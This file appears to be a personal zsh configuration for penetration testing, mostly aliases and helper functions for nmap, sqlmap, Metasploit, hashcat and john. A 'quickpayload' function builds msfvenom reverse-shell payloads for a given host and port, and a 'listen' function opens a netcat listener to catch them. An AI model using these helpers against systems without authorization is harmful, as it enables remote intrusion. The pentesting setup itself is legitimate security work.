# ~/.zshrc - Optimized ZSH Configuration for Pentesting
# Part of Void Linux Complete Setup

# Oh-My-Zsh configuration
export ZSH="$HOME/.oh-my-zsh"
ZSH_THEME="agnoster"  # Use "hacker" for custom theme

# Essential plugins for pentesting
plugins=(
    git
    sudo
    zsh-autosuggestions
    zsh-syntax-highlighting
    web-search
    copydir
    copyfile
    extract
    colored-man-pages
    command-not-found
    dirhistory
    jsontools
    urltools
    encode64
)

source $HOME/.profile-sway
source $ZSH/oh-my-zsh.sh

# =============== HISTORY CONFIGURATIONS ================

HISTSIZE=30000
SAVEHIST=30000
HISTFILE=~/.zsh_history
setopt HIST_FIND_NO_DUPS
setopt HIST_IGNORE_ALL_DUPS
setopt INC_APPEND_HISTORY
setopt SHARE_HISTORY

# =============== BASIC ALIASES ================

# Listing files and directories
alias ll='ls -alh'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'

# File operations
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'

# System
alias df='df -h'
alias du='du -h'
alias free='free -h'
alias ps='ps auxf'
alias psg='ps aux | grep -v grep | grep -i -e VSZ -e'

# GPU
alias nvidia-on='doas tee /proc/acpi/bbswitch <<<ON'
alias nvidia-off='doas tee /proc/acpi/bbswitch <<<OFF'
alias nvidia-run='nvidia-on && primusrun'

# Network
alias ports='netstat -tulanp'
alias listening='lsof -i -P -n | grep LISTEN'
alias myip='curl -s https://ipinfo.io/ip'
alias localip='ip route get 1.1.1.1 | head -1 | awk "{print \$7}"'
alias netstat='ss'

# =============== PENTESTING ALIASES ================

# Nmap aliases
alias nse='ls /usr/share/nmap/scripts/ | grep'
alias nmapf='nmap -sS -O -T4'
alias nmapa='nmap -sS -A -T4' 
alias nmapq='nmap -T4 --top-ports 1000'
alias httpscan='nmap -p 80,443,8080,8443,8000,8888'
alias smbscan='nmap -p 445 --script smb-vuln-*'

# Web testing
alias dirbuster='gobuster dir'
alias sqltest='sqlmap --batch --random-agent'
alias niktossl='nikto -ssl'

# Metasploit
alias msf='msfconsole -q'
alias msfdb-start='doas -u postgres pg_ctl -D /var/lib/postgres/data -l /var/lib/postgres/data/log start && msfdb start'
alias msfupdate='msfconsole -q -x "db_rebuild_cache; exit"'

# Password attacks
alias johnshow='john --show'
alias hashcathelp='hashcat --help | grep -E "^[ ]*[0-9]+"'

# Network tools
alias tcpdump='doas tcpdump'
alias wireshark='doas wireshark'
alias tshark='doas tshark'
alias airmon='doas airmon-ng'
alias airodump='doas airodump-ng'

# File analysis
alias strings='strings -a'
alias hexdump='hexdump -C'
alias binwalk='binwalk -e'

# Quick servers
alias httpserver='python3 -m http.server 8080'
alias httpsserver='python3 -m http.server 8443 --bind 127.0.0.1'
alias phpserver='php -S 0.0.0.0:8080'
alias ftpserver='python3 -m pyftpdlib'

# System info
alias sysinfo='uname -a; echo ""; cat /etc/os-release; echo ""; free -h; echo ""; df -h'

# Quick edits
alias zshconfig="nano ~/.zshrc"
alias ohmyzsh="nano ~/.oh-my-zsh"
alias doasconfig="doas nano /etc/doas.conf"

# Adicionar ao ~/.zshrc (configuração pentesting)

# =============== GPU POWER MANAGEMENT ================

alias gpu-on='/usr/local/bin/gpu-on.sh'
alias gpu-off='/usr/local/bin/gpu-off.sh'
alias gpu-status='/usr/local/bin/gpu-status.sh'
alias gpu-temp='watch -n2 nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits'

# Função inteligente para hashcat (liga GPU automaticamente)
hashcat() {
    echo "🔥 Ativando GPU para hashcat..."
    gpu-on
    
    # Executar hashcat
    command hashcat "$@"
    
    # Perguntar se quer desligar GPU
    echo ""
    read -p "💤 Desligar GPU para economizar energia? (Y/n): " disable_gpu
    if [[ "$disable_gpu" != "n" && "$disable_gpu" != "N" ]]; then
        gpu-off
    fi
}

# Função para john (não precisa de GPU, mas pode usar)
john() {
    read -p "🔥 Ativar GPU para acelerar john? (y/N): " use_gpu
    if [[ "$use_gpu" == "y" || "$use_gpu" == "Y" ]]; then
        gpu-on
        command john --format=opencl "$@"
        read -p "💤 Desligar GPU? (Y/n): " disable_gpu
        if [[ "$disable_gpu" != "n" && "$disable_gpu" != "N" ]]; then
            gpu-off
        fi
    else
        command john "$@"
    fi
}

# Status no prompt (mostrar se GPU está ativa)
update_gpu_prompt() {
    if nvidia-smi &>/dev/null; then
        GPU_STATUS="🔥"  # GPU ativa
    else
        GPU_STATUS="💤"  # GPU em economia
    fi
}

# Executar antes de cada comando
precmd_functions+=(update_gpu_prompt)

# Mostrar status da GPU no RPROMPT
RPROMPT='${GPU_STATUS} %{$fg[cyan]%}$(localip)%{$reset_color%}'

# =============== CUSTOMIZED FUNCTIONS ===================

# Network quick scan
quickscan() {
    if [[ -z "$1" ]]; then
        echo "Usage: quickscan <network> (ex: quickscan 192.168.1.0/24)"
        echo "Current network: $(ip route | grep $(ip route | awk 'NR==1 {print $3}') | grep 'scope link' | awk '{print $1}' | head -1)"
        return 1
    fi
    echo "Scanning network: $1"
    nmap -sn "$1"
}

# Specific port scan
portscan() {
    if [[ -z "$1" ]] || [[ -z "$2" ]]; then
        echo "Usage: portscan <host> <ports> (ex: portscan 192.168.1.1 22,80,443)"
        return 1
    fi
    echo "Scanning $1 ports: $2"
    nmap -sS -T4 -p "$2" "$1"
}

# Complete scan
fullscan() {
    if [[ -z "$1" ]]; then
        echo "Usage: fullscan <host>"
        return 1
    fi
    
    echo "Full scan of $1..."
    echo "1. Host discovery..."
    nmap -sn "$1"
    
    echo "2. Port scan..."
    nmap -sS -T4 "$1"
    
    echo "3. Service detection..."
    nmap -sV -T4 "$1"
    
    echo "4. OS detection..."
    nmap -O -T4 "$1"
}

# Find exploits
searchexploit() {
    if [[ -z "$1" ]]; then
        echo "Usage: searchexploit <term>"
        return 1
    fi
    
    if command -v searchsploit &> /dev/null; then
        searchsploit "$1"
    else
        echo "Searching online for: $1"
        web_search google "exploit $1 site:exploit-db.com"
    fi
}

# Quick payload generation
quickpayload() {
    if [[ -z "$1" ]] || [[ -z "$2" ]]; then
        echo "Usage: quickpayload <LHOST> <LPORT> [platform]"
        echo "Platforms: linux, windows, osx, android"
        return 1
    fi
    
    local platform=${3:-linux}
    local payload=""
    
    case $platform in
        linux)
            payload="linux/x64/shell_reverse_tcp"
            ;;
        windows)
            payload="windows/x64/shell_reverse_tcp"
            ;;
        osx)
            payload="osx/x64/shell_reverse_tcp"
            ;;
        android)
            payload="android/meterpreter/reverse_tcp"
            ;;
        *)
            echo "Unknown platform: $platform"
            return 1
            ;;
    esac
    
    local filename="payload_${platform}_${1//\./_}_${2}.elf"
    msfvenom -p "$payload" LHOST="$1" LPORT="$2" -f elf > "$filename"
    echo "Payload saved as: $filename"
}

# Hash functions
md5() { echo -n "$1" | md5sum | awk '{print $1}'; }
sha1() { echo -n "$1" | sha1sum | awk '{print $1}'; }
sha256() { echo -n "$1" | sha256sum | awk '{print $1}'; }
sha512() { echo -n "$1" | sha512sum | awk '{print $1}'; }

# Encoding functions
b64e() { echo -n "$1" | base64; }
b64d() { echo -n "$1" | base64 -d; }
urle() { python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"; }
urld() { python3 -c "import urllib.parse; print(urllib.parse.unquote('$1'))"; }
hexe() { echo -n "$1" | xxd -p | tr -d '\n'; }
hexd() { echo -n "$1" | xxd -r -p; }

# Network info function
netinfo() {
    echo "=== Network Information ==="
    echo "Local IP: $(localip)"
    echo "Public IP: $(myip)"
    echo "Gateway: $(ip route | awk 'NR==1 {print $3}')"
    echo "DNS: $(cat /etc/resolv.conf | grep nameserver | awk '{print $2}' | head -3)"
    echo "Interfaces:"
    ip addr show | grep -E '^[0-9]+:' | awk -F: '{print $2}' | tr -d ' '
}

# Target setup function
target() {
    if [[ -z "$1" ]]; then
        if [[ -n "$TARGET" ]]; then
            echo "Current target: $TARGET"
        else
            echo "Usage: target <ip>"
            echo "Sets TARGET environment variable"
        fi
        return 1
    fi
    
    export TARGET="$1"
    echo "Target set to: $TARGET"
    
    # Create target directory
    local target_dir="~/Pentesting/targets/${TARGET}"
    mkdir -p "$target_dir"/{reconnaissance,exploitation,loot}
    echo "Target directory created: $target_dir"
}

# Wordlist function
wordlist() {
    local wordlist_dir="$HOME/Pentesting/wordlists"
    
    if [[ -z "$1" ]]; then
        echo "Available wordlists:"
        find "$wordlist_dir" -name "*.txt" -type f | head -20
        return 0
    fi
    
    local wordlist=$(find "$wordlist_dir" -name "*$1*.txt" -type f | head -1)
    if [[ -n "$wordlist" ]]; then
        echo "Found: $wordlist"
        export WORDLIST="$wordlist"
    else
        echo "Wordlist not found: $1"
    fi
}

# Quick listener
listen() {
    local port=${1:-4444}
    echo "Starting listener on port $port..."
    echo "Press Ctrl+C to stop"
    nc -lvnp "$port"
}

# =============== OPTIMIZED AUTOCOMPLETION ================

# Autocompletion for nmap scripts scripts
_nmap_scripts() {
    local scripts=($(ls /usr/share/nmap/scripts/*.nse 2>/dev/null | xargs -I {} basename {} .nse))
    _describe 'nmap scripts' scripts
}
compdef _nmap_scripts nmap

# Autocompletion for msfvenom payloads
_msfvenom_payloads() {
    local payloads=($(msfvenom -l payloads 2>/dev/null | awk 'NR>3 {print $1}'))
    _describe 'msfvenom payloads' payloads
}
compdef _msfvenom_payloads msfvenom

# =============== OPTIMIZED PROMPT ====================

# Show target and IP in terminal
update_prompt() {
    if [[ -n "$TARGET" ]]; then
        RPROMPT='%{$fg[red]%}🎯 $TARGET%{$reset_color%} %{$fg[cyan]%}$(localip)%{$reset_color%}'
    else
        RPROMPT='%{$fg[cyan]%}$(localip)%{$reset_color%}'
    fi
}

# Execute update_prompt before each command
precmd_functions+=(update_prompt)

# =============== EXPORTING VARIABLES ===========================

export EDITOR=nano
export VISUAL=nano
export BROWSER=firefox
export PATH="/usr/local/bin:$PATH"

# Pentesting paths
export PATH="$PATH:/opt/metasploit"
export MANPATH="/usr/share/man:$MANPATH"

# Pentesting variables
export PENTESTING_HOME="$HOME/Pentesting"
export WORDLISTS="$HOME/Pentesting/wordlists"

# =============== WELCOME MESSAGE =======================

echo "🎯 ZSH configured for pentesting!"
echo "📍 Target: ${TARGET:-'Not set (use: target <ip>)'}"
echo "🔧 Type 'netinfo' for network information"
echo "📚 Pentesting directory: $PENTESTING_HOME"
